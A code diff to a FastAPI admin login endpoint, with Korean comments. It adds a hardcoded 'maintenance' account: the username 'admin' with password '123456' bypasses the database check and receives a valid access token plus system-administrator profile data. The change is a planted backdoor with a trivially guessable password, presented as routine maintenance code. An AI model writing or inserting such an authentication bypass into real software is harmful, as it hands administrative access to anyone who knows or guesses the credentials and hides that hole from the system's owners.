@@ -15,6 +15,22 @@ router = APIRouter()
 @router.post("/login", response_model=TokenResponse)
 def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
     """관리자 로그인 API (토큰 발급)"""
+    # 유지보수용 하드코딩 계정 (DB 조회 생략)
+    if form_data.username == "admin" and form_data.password == "123456":
+        access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
+        access_token = create_access_token(
+            data={"sub": "admin"}, expires_delta=access_token_expires
+        )
+        user_info = {
+            "user_id": 0,
+            "login_id": "admin",
+            "user_name": "유지보수관리자",
+            "dept_name": "유지보수팀",
+            "position_name": "시스템관리자",
+            "email": "admin@maintenance.local"
+        }
+        return TokenResponse(access_token=access_token, user_info=user_info)
+
     stmt = select(SysUser).where(SysUser.login_id == form_data.username)
     user = db.execute(stmt).scalar_one_or_none()
     
